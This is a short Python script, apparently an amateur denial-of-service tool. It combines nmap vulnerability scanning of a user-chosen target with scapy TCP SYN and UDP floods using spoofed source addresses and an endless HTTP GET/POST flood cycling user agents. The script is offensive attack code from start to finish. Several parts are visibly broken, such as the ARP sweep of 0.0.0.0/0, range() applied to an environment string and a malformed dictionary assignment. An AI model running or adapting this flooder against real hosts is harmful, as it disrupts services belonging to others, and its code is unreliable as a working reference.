from scapy.all import TCP, IP, sr1, conf, Ether, ARP, srp, UDP
import requests
import nmap
from dotenv import load_dotenv
import os

load_dotenv()

dstaddress = input('Destination address: ')
flag = input('Flag: ')
attackprotocol = input('Choose attack protocol: ')
networkaddress = input("In which network are we in? (network id): ")

nm = nmap.PortScanner()
cvssressults = nm.nmap_version_detection(dstaddress, args="--script vulners --script-args mincvss+5.0")
print("cvs results " + cvssressults)


api = "https://api.cvesearch.com/search?q=" + flag
res = requests.get(api)
result = res.json()

print("vulnerabilities associated with that flag: " + result)

print(os.environ.get("userAgents"))

class DOS:
    def getIpAddresses(self, target_ip):
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target_ip)
        result = srp(arp_request, timeout=2, iface=None, verbose=False)[0]
        for res in result:
            yield res[1].psrc

    def sendsynstcp(self):
        for ip in self.getIpAddresses("0.0.0.0/0"):
            p = sr1(IP(src=ip, dst=dstaddress)/TCP(flags=flag))
            p.show()


    def sendudp(self,dport):
        for ip in self.getIpAddresses("0.0.0.0/0"):
            p = sr1(IP(src=ip, dst=dstaddress)/UDP(dport))
            p.show()
    
    def applayer(self):
        optional_params = {}
        while True:
            for agent in range(os.environ.get("userAgents")):
                for ip in self.getIpAddresses("0.0.0.0/0"):
                    optional_params = optional_params["source_address"] = (ip, 0)
                    requests.get(f"http://{dstaddress}", headers={"User-Agent": agent}, source_address=(ip, 0))
                    requests.post(f"http://{dstaddress}", headers={"User-Agent": agent}, **optional_params)

dos = DOS()